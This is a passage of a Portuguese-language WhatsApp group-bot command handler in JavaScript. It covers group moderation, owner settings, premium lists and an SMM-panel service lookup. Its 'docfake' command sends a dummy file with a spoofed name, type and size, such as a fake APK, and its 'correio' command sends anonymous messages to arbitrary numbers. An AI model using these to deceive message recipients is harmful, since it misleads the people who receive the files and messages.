                resposta += `ID: ${servico.service}\nNome: ${servico.name}\nPreço: $${servico.rate}\nMin: ${servico.min} / Max: ${servico.max}\n\n`;
            });

            enviar(resposta);
        })
        .catch(() => {
            enviar('❌ Erro ao buscar a categoria.');
        });

    } catch (e) {
        return enviar('❌ Erro interno ao buscar categoria.');
    }
break;

case 'categorias':
    try {
      reagir(from, "✅️")
        let apiUrl = 'https://upmidiass.net/api/v2';
        let fetch = require('node-fetch');

        fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                key: API_UPDIMIA,
                action: 'services'
            })
        })
        .then(res => res.json())
        .then(data => {
            if (!data || data.length === 0) return enviar('❌ Nenhuma categoria encontrada.');

            let categorias = [...new Set(data.map(servico => servico.category))]; // Remove categorias duplicadas

            let resposta = '📌 *Categorias Disponíveis:*\n\n';
            categorias.forEach(categoria => {
                resposta += `🔹 ${categoria}\n`;
            });

            enviar(resposta);
        })
        .catch(() => {
            enviar('❌ Erro ao buscar as categorias.');
        });

    } catch (e) {
        return enviar('❌ Erro interno ao listar categorias.');
    }
break;

case 'seradm':
if(!SoDono) return enviar("Só dono pode executar este comando.")
mentions(`${sender.split("@")[0]} Pronto - Agora você é um administrador..`, [sender], true)
client.groupParticipantsUpdate(from, [sender], "promote")
break

case 'sermembro':
if(!SoDono) return enviar("Só dono pode executar este comando.")
mentions(`${sender.split("@")[0]} Pronto - Agora você é um membro comum..`, [sender], true)
client.groupParticipantsUpdate(from, [sender], "demote")
break

case 'advertir':
case 'adverter': 
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(menc_os2 == botNumber) return enviar("Não pode advertir o próprio bot.");
if(menc_os2 == nmrdn) return enviar("Não pode advertir o próprio dono do bot.");
if(groupAdmins.includes(menc_os2)) return enviar("Não é possível advertir adminstrador do grupo.");
if(!JSON.stringify(groupMembers).includes(menc_os2)) return enviar("Não tem como advertir um usuário que não se encontra mais no grupo.")
ADVT.push(menc_os2); setGp(dataGp)  
setTimeout(async() => {
var dfqn = ADVT.filter(x => x == menc_os2).length
var dfntxt = mess.warningAdvertencia(menc_os2, dfqn)
if(!dfntxt.includes("3/3")) {
if(!JSON.stringify(ADVT).includes(sender)) {
await sleep(1500); mentions(dfntxt, [menc_os2])
} else if(dfqn == 2) {
await sleep(1500); mentions(dfntxt, [menc_os2])
}} else {safeSendMessage(from, {text: mess.finishAdvertencia(menc_os2), mentions: [menc_os2]})
await sleep(1500)
client.groupParticipantsUpdate(from, [menc_os2], "remove")
var i = ADVT.indexOf(menc_os2); ADVT.splice(i, 3); setGp(dataGp)}}, 3000)
break

case 'rmadv':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!marc_tds) return enviar("Você esqueceu de mencionar o alvo após o comando.")
adv = dataGp[0].advertir.map(i => i).indexOf(marc_tds)
if(adv < 0) return enviar("Este usuário não contém nenhuma advertência no grupo.")
dataGp[0].advertir.splice(adv, 1)
setGp(dataGp)
enviar("A advertência do usuário neste grupo foi retirada com sucesso!")
break

//======≠(INFOS/EXECUÇÃO/DONO)≠=========\\

case 'sairdogp':
if(!SoDono)return enviar(arise.donosmt)  
if(!q) return enviar(`🔹 Uso correto: ${prefix}sairdogp`)
var getGroups = await client.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
try {
safeSendMessage(ingfoo[q].id, {text: "Irei sair do grupo, por ordem do meu dono, adeus..."}) 
setTimeout(() => {
client.groupLeave(ingfoo[q].id)
}, 5000)
} catch(erro) {
enviar(String(erro))
}
enviar("Pronto meu dono, sair do grupo que você queria, em caso de dúvidas acione o comando listagp pra verificar..")
break

case 'listagp':
if(!SoDono && !info.key.fromMe) return enviar('```SOMENTE MEU DONO LINDÃO```')
var getGroups = await client.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
teks1 = `LISTA DE GRUPOS / COMUNIDADES\n*Total de Grupos:* ${ingfoo.length}\n-\n`
for (let i = 0; i < ingfoo.length; i++){
var metadt = await client.groupMetadata(ingfoo[i].id) 
try {
var linkdogp = await client.groupInviteCode(ingfoo[i].id)
} catch {
var linkdogp = "Não foi possivel puxar o link."
}
teks1 += `( ${i} ) - Nome do Grupo: ${ingfoo[i].subject}\nID: ${ingfoo[i].id}\nLink do Grupo: https://chat.whatsapp.com/${linkdogp}\nCriado por: ${metadt.subjectOwner}\nCriado em: ${moment(`${ingfoo[i].creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\nTotal de Participantes: ${ingfoo[i].participants.length}\n-\n`
}
enviar(teks1)
break

case 'atividade':
case 'atividades':
try{
if(!isGroupAdmins && !SoDono) return enviar(arise.adm)
if(isGroup && JSON.stringify(countMessage).includes(from)) {
var i6 = countMessage.map(i => i.groupId).indexOf(from)
if(countMessage[i6].numbers.length == 0) return
teks = `🪖 *Atividade dos membros do grupo:*\n–\n`
for(i = 0; i < countMessage[i6].numbers.length; i++) {
var i8 = countMessage[i6].numbers.map(i => i.id).indexOf(countMessage[i6].numbers[i].id)  
var uscnt = countMessage[i6].numbers[i]
teks += `• Participante: *@${uscnt.id.split('@')[0]}*\n• Comandos usados: *${uscnt.cmd_messages}*\n• Mensagens enviadas: *${uscnt.messages}*\n• Conectado em: *${uscnt.aparelho}*\n• Figurinhas enviadas: *${uscnt.figus}*\n–\n`
}
mention(teks)
} else return enviar('*Nada foi encontrado*')
} catch (e){
console.log(e)
}
break

case 'inativos':
case 'inativo':  
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(q.match(/[a-z]/i) || !q) return enviar(`🔹 Uso correto: ${prefix + command} 0\nIsso mostrará quantas pessoas tem 0 mensagens no grupo, e se usar 5, vai mostrar quantos usuários tem 5 mensagens ou menos..`)
var i2 = countMessage?.map(x => x.groupId)?.indexOf(from)
blue = []; for (i of countMessage[i2].numbers) {
if(i.messages <= q.trim())
if(i.figus <= q.trim())
if(i.cmd_messages <= q.trim())
if(!groupAdmins.includes(i.id))
if(!numerodono.includes(i.id))
if(i.id != botNumber)
if(groupMembers.map(i => i.id).includes(i.id))
blue.push(i.id)}; for ( i of countMessage[i2].numbers) {
if(!groupMembers.map(i => i.id).includes(i.id))
if(i.id.length > 5)
blue.push(i.id)}
if(blue.length == 0) return enviar(`Não tem pessoas com ${q} mensagens..`)
bli = `Usuários com *${q.trim()}* mensagem(ns) pra baixo estão listados abaixo, verifique:\n–\n`
for (ac = 0; ac < blue.length; ac++) {
bli += `*${ac+1}.* @${blue[ac].split("@")[0]}\n`
}
mention(bli)
break

case 'banghost':
if(!isGroup) return enviar(arise.grupo)  
if(!SoDono) return enviar(arise.donosmt)
if(q.match(/[a-z]/i) || !q || q.length > 3) return enviar(`Digite a partir de quantas mensagens pra baixo você deseja remover (que não interaje no grupo).\nExemplo: ${prefix + command} 0`)
var i2 = countMessage?.map(x => x.groupId)?.indexOf(from)
blue = []; for (i of countMessage[i2].numbers) {
if(i.messages <= Number(q.trim()))
if(i.figus <= Number(q.trim()))
if(i.cmd_messages <= Number(q.trim()))
if(!groupAdmins.includes(i.id))
if(!numerodono.includes(i.id))
if(i.id != botNumber)
if(groupMembers.map(i => i.id).includes(i.id))
blue.push(i.id)}; for ( i of countMessage[i2].numbers) {
if(!groupMembers.map(i => i.id).includes(i.id))
if(i.id.length > 5)
blue.push(i.id)}
if(blue.length == 0) return enviar(`Não tem mais pessoas com ${q.trim()} mensagem(ns) para eu remover..`)
for ( i = 0; i < blue.length; i++) {
await sleep(1000)
client.groupParticipantsUpdate(from, [blue[i]], "remove")}
break

case 'correio':
txt = args.join(" ")
if(!txt) return enviar(mess.syntaxAnonymousMail)
let txt1 = txt.split("/")[0].replace(/\D/g,'');
let txt2 = txt.split("/")[1];
if(!txt1) return enviar('*Cadê o número do destinatário?*')
if(!txt2) return enviar('*Cadê a mensagem para ser enviada ao destinatário?*')
let [result] = await client.onWhatsApp(txt1)
if(!result) return enviar(`O número fornecido está indisponível no WhatsApp! Verifique por favor.`)
setTimeout(() => {reagir(from, "💌️")}, 50)
enviar(mess.sucessAnonymousMail())
safeSendMessage(result.jid, {text: mess.anonymousMail(txt2)}).catch((error) => {
return enviar("Error ao encaminhar a mensagem, tente novamente mais tarde!")
})
break

case 'nome-bot':
if(!SoDono && !info.key.fromMe) return enviar(arise.donosmt)
setting.NomeDoBot = q
fs.writeFileSync('./dono/config.json', JSON.stringify(setting, null, 2))
enviar(`Meu nome foi alterado com sucesso para: ${q}`)
setTimeout(async () => {
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break

case 'nick-dono':
if(!SoDono && !info.key.fromMe) return enviar(arise.donosmt) 
setting.NickDono = q
fs.writeFileSync('./dono/config.json', JSON.stringify(setting, null, 2))
enviar(`O nick do dono foi configurado para: ${q}`)
setTimeout(async () => {
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break

case 'numero-dono':
if(!SoDono && !info.key.fromMe) return enviar(arise.donosmt)  
if(q.match(/[a-z]/i)) return enviar("É apenas números..")
enviar(`O número dono foi configurado com sucesso para: ${q}`)
setting.numerodono = q
fs.writeFileSync('./dono/config.json', JSON.stringify(setting, null, 2))
setTimeout(async () => {
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break

case 'prefixo-bot': case 'setprefix':
if(!q) return
if(!SoDono && !info.key.fromMe) return enviar(arise.donosmt)
setting.prefix = q
fs.writeFileSync('./dono/config.json', JSON.stringify(setting, null, 2))
enviar(`O prefixo foi alterado com sucesso para: ${setting.prefix}`)
setTimeout(async () => {
setTimeout(async () => {
process.exit()
}, 1200)
}, 1000)
break

case 'fotomenu':
case 'fundomenu':
if(!SoDono) return enviar(arise.donosmt)
YSG = isQuotedImage || isImage
if(!YSG) {
enviar(`Você precisa marcar uma imagem`)
return
}
if(isMedia && info.message.imageMessage.fileLenght < 209715200 || isQuotedImage && info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage.fileLength < 209715200) { 
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await getFileBuffer(boij, 'image')
await sleep(1000)
reagir(from, "📷")
let hou = await upload(owgi)
ftmenu.logo.splice([])
fs.writeFileSync('./dono/logos.json', JSON.stringify(ftmenu, null, 2))
setTimeout(() => {
ftmenu.logo.push(hou)
fs.writeFileSync('./dono/logos.json', JSON.stringify(ftmenu, null, 2))
enviar(`A foto do menu foi alterada para: ${hou}`)
}, 1200)
} else {
enviar(`Mande uma imagem com o comando ${prefix + command} para trocar a foto de todos menu..`)
}
break

case 'configurar':
enviar(`${prefix}nome-bot ex: tisukino\n${prefix}nick-dono ex: yatomods\n${prefix}numero-dono ex: +558893......\n${prefix}prefixo-bot ex: #\n${prefix}fotomenu mencione uma imagem.`)
break

case 'privphotobot': {
if(!SoDono) return enviar(arise.donosmt)
if (!q) return enviar(mess.syntaxPrivatePhotoBot)
if (args[0] === 'all') {
enviar(`- A minha foto do perfil agora está visível à todos.`)
await client.updateProfilePicturePrivacy('all')
} else if (args[0] === 'cntt') {
enviar(`- A minha foto do perfil agora está visível somente aos meus contatos.`)
await client.updateProfilePicturePrivacy('contacts')
} else if (args[0] === 'ngm') {
enviar(`- A foto do meu perfil está privada a todos, até mesmo ao senhor mestre.`)
await client.updateProfilePicturePrivacy('none')
}
}
break

case 'privaddgroup': {
if(!SoDono) return enviar(arise.donosmt)
if (!q) return enviar(mess.syntaxPrivAddGroup)
if (args[0] === 'all') {
enviar(`- Pronto, agora todos pode me adicionar em grupo normalmente.`)
await client.updateGroupsAddPrivacy(`all`)
} else if (args[0] === 'cntt') {
enviar(`- Agora somente meus contatos, pode me adicionar em grupo.`)
await client.updateGroupsAddPrivacy(`contacts`)
} else if (args[0] === 'ngm') {
enviar(`- Agora ninguém pode ousar me adicionar em grupo, pois será negado.`)
await client.updateGroupsAddPrivacy('none')
}
}
break

case 'setprefix':
if(!SoDono && !SoDono && !info.key.fromMe) return enviar(arise.donosmt)
prefix = args[0]
setting.prefix = prefix
fs.writeFileSync('./dono/config.json', JSON.stringify(setting, null, 2))
enviar(`O prefixo foi alterado com sucesso para: `)
break

case 'nomegp':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!isBotGroupAdmins) return enviar(arise.Badmin)
client.groupUpdateSubject(from, `${body.slice(9)}`)
safeSendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: non})
break

case 'dono1':
if(!SoDono) return enviar(arise.donosmt)
nescessario.numero_dono1 = q.trim()
dono1 = nescessario.numero_dono1
setNes(nescessario)
enviar(`Agora contem um segundo dono(a) alterado com sucesso para: ${q}`)
break

case 'dono2':
if(!SoDono) return enviar(arise.donosmt)
nescessario.numero_dono2 = q.trim()
dono2 = nescessario.numero_dono2
setNes(nescessario)
enviar(`Agora contem um segundo dono(a) alterado com sucesso para: ${dono2}`)
break

case 'dono3':
if(!SoDono) return enviar(arise.donosmt)
nescessario.numero_dono3 = q.trim()
dono3 = nescessario.numero_dono3
setNes(nescessario)
enviar(`Agora contem um terceiro dono(a) alterado com sucesso para: ${dono3}`)
break

case 'dono4':
if(!SoDono) return enviar(arise.donosmt)
nescessario.numero_dono4 = q.trim()
dono4 = nescessario.numero_dono4
setNes(nescessario)
enviar(`Agora contem um quarto dono(a) alterado com sucesso para: ${dono4}`)
break

case 'dono5':
if(!SoDono) return enviar(arise.donosmt)
nescessario.numero_dono5 = q.trim()
dono5 = nescessario.numero_dono5
setNes(nescessario)
enviar(`Agora contem um quinto dono(a) alterado com sucesso para: ${dono5}`)
break

case 'dono6':
if(!SoDono) return enviar(arise.donosmt)
nescessario.numero_dono6 = q.trim()
dono6 = nescessario.numero_dono6
setNes(nescessario)
enviar(`Agora contem um quinto dono(a) alterado com sucesso para: ${dono6}`)
break

case 'getquoted':
enviar(JSON.stringify(info.message.extendedTextMessage.contextInfo, null, 3))
break

case 'donos':
enviar(mess.ownersList(NomeDoBot, numerodono_ofc, numero_dono1, numero_dono2, numero_dono3, numero_dono4, numero_dono5, numero_dono6))
break

case 'admins':
case 'listadmins':  
case 'listaadmins':   
if(!isGroup) return enviar(arise.grupo)
ytb = `*Lista de admins do grupo:*\n*Total de Adminstradores:* ${groupAdmins.length}\n-\n`
no = 0
for (let admon of groupAdmins) {
no += 1
ytb += `( ${no.toString()} ) - @${admon.split('@')[0]}\n`
}
mentions(ytb, groupAdmins, true)
break

case 'ativo': case 'on':
if(!isGroupAdmins) return enviar(arise.adm)
if(SoDono) {
let path = "./banco de dados/func/afk/afk-@" + numerodono_ofc + ".json"
if(fs.existsSync(path)) {  
DLT_FL(path);
enviar("Bem vindo de volta mestre 🧝🏻")
} else {
enviar("Você não registrou nenhuma mensagem de ausência.")
}
} else if(isGroupAdmins) {
let index = dataGp[0].ausentes.findIndex(x => x.id === sender)
if(index === -1) return enviar("Não há nenhum registro de ausência.")
dataGp[0].ausentes.splice(index, 1)
setGp(dataGp)
enviar("Registro de ausência deletado com sucesso.")
}
break

case 'ausente': case 'off': case 'afk':
if(!isGroupAdmins) return enviar(arise.adm)
if(SoDono) {
msgtmp = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
fs.writeFileSync(`./banco de dados/func/afk/afk-@${setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "")}.json`,
JSON.stringify({
Ausente_Desde: msgtmp, 
Motivo_Da_Ausência: q
}, null, 2));
enviar(`Mensagem de ausência criada com sucesso.`)
} else if(isGroupAdmins) {
if(!q.trim()) return enviar(`Digite a mensagem de ausência, Exemplo: ${prefix + command} Estou comendo.`)
if(!JSON.stringify(dataGp[0].ausentes).includes(sender)) {
dataGp[0].ausentes.push({id: sender, msg: q.trim()})
setGp(dataGp)
enviar(`Mensagem de ausência criada com sucesso..\nSe deseja desativar a mensagem de ausência use o comando ${prefix}ativo`)
} else {
dataGp[0].ausentes[dataGp[0].ausentes.map(i => i.id).indexOf(sender)].msg = q.trim()
setGp(dataGp)
enviar("Mensagem de ausência alterada com sucesso.")
}
} else {
return enviar("Apenas meu dono.")
}
break

case 'addpremium': 
if(!SoDono) return enviar(arise.donosmt)
barra = q.replace(" /", "/").replace("/ ", "/").replace(" / ", "/")
var [nmr, tempo50] = barra.split('/')
if(!nmr || !tempo50) return mention(`🔹 Uso correto: *${prefix + command} @${nmrdn.split('@')[0]}/30*`)
usur = nmr.includes('@') ? nmr.split('@')[1] + "@s.whatsapp.net" : nmr + "@s.whatsapp.net"
mega = Number(tempo50) > 0 ? false : true
dvip = moment.tz('America/Sao_Paulo').format('DD')
bla = JSON.stringify(premium).includes(usur)
if(bla) {
AB = premium.map(i => i.id).indexOf(usur)
premium[AB].dias += Number(tempo50)
fs.writeFileSync('./banco de dados/usuarios/premium.json', JSON.stringify(premium))
safeSendMessage(from, {text: `${tempo50} dia${Number(tempo50) > 1 ? `s` : ``} fo${Number(tempo50) > 1 ? `ram` : `i`} adicionado${Number(tempo50) > 1 ? `s` : ``} ao usuário @${usur.split("@")[0]}`, mentions: [usur]}, {quoted: non})
} else {
premium.push({id: usur, dias: Number(tempo50), save: Number(dvip), infinito: mega})
fs.writeFileSync('./banco de dados/usuarios/premium.json', JSON.stringify(premium))
safeSendMessage(from, {text: `${Number(tempo50) > 0 ? `@${usur.split("@")[0]} foi adicionado com sucesso!` : `@${usur.split("@")[0]} foi agraciado com premium infinito!`}`, mentions: [usur]}, {quoted: non})
}
break

case 'delpremium':
if(!SoDono) return enviar(arise.donosmt)
if(!marc_tds) return enviar(`Marque o usuário que deseja remover da lista premium.️`)
if(!JSON.stringify(premium).includes(marc_tds)) return enviar("Este número não está incluso atualmente na lista de usuários premium(ns)..")
AB = premium.map(i => i.id).indexOf(marc_tds)
premium.splice(AB, 1)
fs.writeFileSync('./banco de dados/usuarios/premium.json', JSON.stringify(premium))
safeSendMessage(from, {text: `@${marc_tds.split("@")[0]} foi removido da lista premium com sucesso!`, mentions: [marc_tds]}, {quoted: non})
break

case 'usersprem': {
if (premium.length === 0) {
return enviar(`😕 Opa! Parece que ainda *ninguém* adquiriu o premium.\nSeja o primeiro a brilhar ✨ usando: *${prefix}comprarpremium*`);
}
reagir(from, "🌟");
let texto = `╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾╼╾╼╾╼╾╮\n│╭┬━─━─━─━─━─━─━─𔓕\n`;
texto += premium.map((v, index) => {
const numero = v.id.split('@')[0];
const status = v.infinito ? `🔒 *Acesso Infinito*` : `⏳ *Expira em ${v.dias} dia${v.dias > 1 ? 's' : ''}*`;
return `│┊├🩶 ${index + 1}. ${numero}\n│┊├💙   ${status}`;
  }).join('\n┝━━\n');

texto += `\n│╰┴━─━─━─━─━─━─━─𔓕\n╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾╼╾╼╾╼╾╯`;
await enviar(texto, { mentions: premium.map(v => v.id) });
}
break;

case 'limpar':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
safeSendMessage(from, {text: clear}, {quoted: non, contextInfo : { forwardingScore: 500, isForwarded:true}})
break

case 'doc':
case 'docfake':
try {
sprd = "|"
if(!q) return enviar(`${prefix + command} exemplo${sprd}500${sprd}apk\n-\nOs tipos aceitos por enquanto são: pdf > xml > zip > jpg > ppt > apk > txt > aac > pptx > aac > m4a > mp4 > mp3 > svg > png`)
kls = args.join(' ')
let nomedoc = kls.split(sprd)[0] || `${setting.NomeDoBot}`
let peso = kls.split(sprd)[1] * 1000000 || '1000000'
let mimetyp = kls.split(sprd)[2].replace(" ", "") || 'gif'
let thumbc = kls.split(sprd)[3] || 'https://google.com/'
if(mimetyp.toLowerCase() == 'pdf') mimetyp = 'application/pdf'
if(mimetyp.toLowerCase() == 'apk') mimetyp = 'application/vnd.android.package-archive'
if(mimetyp.toLowerCase() == 'aac') mimetyp = 'audio/aac'
if(mimetyp.toLowerCase() == 'xml') mimetyp = 'application/xml'
if(mimetyp.toLowerCase() == 'zip') mimetyp = 'application/zip'
if(mimetyp.toLowerCase() == 'jpg') mimetyp = 'image/jpeg'
if(mimetyp.toLowerCase() == 'ppt') mimetyp = 'application/vnd.ms-powerpoint'
if(mimetyp.toLowerCase() == 'pptx') mimetyp = 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
if(mimetyp.toLowerCase() == 'mp4') mimetyp = 'video/mp4'
if(mimetyp.toLowerCase() == 'm4a') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'mp3') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'gif') mimetyp = 'image/gif'
if(mimetyp.toLowerCase() == 'png') mimetyp = 'image/png'
if(mimetyp.toLowerCase() == 'svg') mimetyp = 'image/svg+xml'
if(mimetyp.toLowerCase() == 'txt') mimetyp = 'text/plain'
let Messagemdoc = {document: fs.readFileSync('./banco de dados/data/docf.txt'), mimetype: mimetyp, jpegThumbnail: await getBuffer(thumbc), fileName: nomedoc, fileLength: peso, headerType: 4, contextInfo:{forwardingScore:999,isForwarded:true}}
safeSendMessage(from, Messagemdoc, {quoted: non})
} catch (err) {
console.log(err)
enviar(`Ops ocorreu um erro`)
}
break

case 'deletar': case 'del':  case 'd':
if(!isGroupAdmins) return enviar(arise.adm)
if(!menc_prt) return enviar("Marque a mensagem do usuário que deseja apagar..")
safeSendMessage(from, { delete: { remoteJid: from, fromMe: false, id: info.message.extendedTextMessage.contextInfo.stanzaId, participant: menc_prt}})
break

case 'antiligar':
case 'antiligacao':  
case 'antiligação':  
if(!SoDono) return enviar(arise.donosmt)
if(!isAnticall) {
nescessario.anticall = true
setNes(nescessario)
enviar(`O anti ligação foi ativado com sucesso. Caso alguém efetue uma ligação para me será bloqueado.`)
} else if(isAnticall) {
nescessario.anticall = false
setNes(nescessario)
enviar('O anti ligação foi desativado com sucesso.')
}
break

case 'antipv':  
if(!SoDono) return enviar(arise.donosmt)
if(!isAntiPv) {
nescessario.antipv = true
setNes(nescessario)
enviar(`Antipv ativado com sucesso, caso alguém enviar mensagem para mim, irei bloquear!`)
} else if(isAntiPv) {
nescessario.antipv = false
setNes(nescessario)
enviar('A função antipv foi desabilitada com sucesso..')
}
break

case 'antipv2':
if(!SoDono) return enviar(arise.donosmt)
if(!isAntiPv2) {
nescessario.antipv2 = true
setNes(nescessario)
enviar("Antipv2 ativado com sucesso, o pv pode ser usado, mas não bloquearei, só irei flodar a cada mensagem que ele enviar avisando..")
} else if(isAntiPv2) {
nescessario.antipv2 = false
setNes(nescessario)
enviar("Antipv2 desativado com sucesso..")
}
break

case 'antipv3':
if(!SoDono) return enviar(arise.donosmt)
if(!isAntiPv3) {
nescessario.antipv3 = true
setNes(nescessario)
enviar("Antipv3 ativado com sucesso, irei ignorar todas as mensagens recebidas no pv..")
} else if(isAntiPv3) {
nescessario.antipv3 = false
setNes(nescessario)
enviar("Antipv3 desativado com sucesso..")
}
break

case 'limitarcmd': case 'limitarcomando': case 'limitecmd':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
dataGp[0].Limitar_CMD = !dataGp[0].Limitar_CMD
setGp(dataGp);
enviar(dataGp[0]?.Limitar_CMD ? "Limitador de comandos ativado com sucesso no grupo: "+groupName : "Limitador de comandos desativado no grupo: "+groupName)
break;

case 'tempocmd':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
if(!q.trim()) return enviar(`🔹 Uso correto: ${prefix + command} 120\n60 = 1 minuto.`)
dataGp[0].Limit_tempo = q.trim()
setGp(dataGp)
enviar(`Tempo limite definido para: ${TimeCount(q.trim())} a cada comando.`)
break;

case 'banuser':
if(!SoDono  && !info.key.fromMe) return enviar(arise.donosmt)
if(!q.length > 6) return enviar("Marque o @ do usuário que deseja bloquear de ele utilizar os comandos, ou o número da fórma que copiar...")
var blcp = q.replace(new RegExp("[()+-/ @+/]", "gi"), "")+"@s.whatsapp.net"
var numblc = ban.indexOf(blcp)
if(numblc >= 0) return enviar('*Esse número já esta incluso na lista de bloqueio.*')
ban.push(blcp)
fs.writeFileSync('./banco de dados/usuarios/banned.json', JSON.stringify(ban))
safeSendMessage(from, {text: mess.bannedMessage(blcp), mentions: [blcp]})
break

case 'unbanuser':
if(!SoDono  && !info.key.fromMe) return enviar(arise.donosmt)
if(!q.length > 6) return enviar("Marque o @ do usuário que deseja desbloquear pra ele utilizar os comandos, ou o número da fórma que copiar...")
var blcp = q.replace(new RegExp("[()+-/ @+/]", "gi"), "")+"@s.whatsapp.net"
var numbl = ban.indexOf(blcp)
if(numbl < 0) return enviar('*Esse número não está incluso na lista de bloqueados.*')
pesquisar = blcp
processo = ban.indexOf(pesquisar)
while(processo >= 0){
ban.splice(processo, 1)
processo = ban.indexOf(pesquisar)
}
fs.writeFileSync('./banco de dados/usuarios/banned.json', JSON.stringify(ban))
safeSendMessage(from, {text: mess.unbannedMessage(blcp), mentions: [blcp]})
break
                  
case 'vozgpt':
if(q.length < 5) return enviar(`⎚  Exemplo: ${prefix + command} texto`);
try {
const gtts = require('./exports/funcoes/gtts')(args[0])
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
if(dtt.length > 200) return enviar('Para reduzir spam o máximo de letras permitidas são 200!')
gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
safeSendMessage(from, {audio: fs.readFileSync(ranm), ptt:true, mimetype: "audio/mpeg"}, {quoted: non}).catch(e => {
return enviar(mess.error())
})
DLT_FL(ranm)
DLT_FL(rano)
})
})
} catch {
return enviar(mess.error())
}
break

case 'tagme':
const tagme = `${sender.split("@")[0]} ✔️`
await mentions(tagme, [sender], true)
break

case 'addcmdprem':
if(!SoDono) return enviar(arise.donosmt)
tp = args.join(" ")
if(tp.includes("addcmdprem addcmdprem") || (tp.includes("addcmdprem  addcmdprem"))) return enviar(`Tá louco maluco? Não tem como adicionar o mesmo comando.`)
if(isCmdPremium.includes(args[0]))return enviar('Este comando já está incluso na lista de comandos premium, verifique.')
isCmdPremium.push(args[0])
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, 2))
enviar(`O comando *${args[0]}* foi adicionado na lista premium.`)
break

case 'delcmdprem':
if(!SoDono) return enviar(arise.donosmt)
tp = args.join(" ")
if(tp.includes("delcmdprem delcmdprem") || (tp.includes("delcmdprem  delcmdprem"))) return enviar(`Tá louco maluco? Não tem como deletar o mesmo comando.`)  
if(!isCmdPremium.includes(args[0]))return enviar('Este comando já está excluído da lista de comandos premium.')
var i = isCmdPremium.indexOf(args[0])
isCmdPremium.splice(i, 1)
fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, 2))
enviar(`O comando *${args[0]}* foi tirado da lista premium.`)
break

case 'listacmdprem':
tkks = `[Total: *${isCmdPremium.length}*] - Comandos que foram adicionados para uso Premium:\n–\n`
tkks += isCmdPremium.map((v, index) =>  `\t• [ *N° ${index+1}* ] - Comando: ${v}`).join('\n–\n')
safeSendMessage(from, {text: tkks.trim()}, {quoted: non})
break

case 'blocklist':
if(ban.length == 0) return enviar(`Existe *0* user(s) bloqueado(s), ou seja, não existe ninguém.`)
tkks = `[Total: *${ban.length}*] - Lista de Usuários bloqueados:\n–\n`
tkks += ban.map((v, index) =>  `\t• [ *N° ${index+1}* ] - Usuário: @${v.split('@')[0]}`).join('\n–\n')
safeSendMessage(from, {text: tkks.trim(), mentions: ban}, {quoted: non})
break

case 'blockcmdgp':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
tp = args.join(" ")
if(tp.includes("blockcmd blockcmd") || (tp.includes("blockcmd  blockcmd"))) return enviar(`Tá louco maluco?, Quer banir o comando de bloquear comando?`)
if(getComandoBlock(from).includes(args[0]))return enviar('Este comando já está bloqueado.')
addComandos(from, args[0])
enviar(`O comando *${args[0]}* foi bloqueado no grupo com sucesso.`)
break

case 'unblockcmdgp':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
tp = args.join(" ")
if(tp.includes("blockcmd unblockcmd") || (tp.includes("blockcmd  unblockcmd"))) return enviar(`Tá louco maluco?, Quer banir o comando de desbloquear comando?`)  
if(!getComandoBlock(from).includes(args[0]))return enviar('Este comando já está desbloqueado.')
deleteComandos(from, args[0])
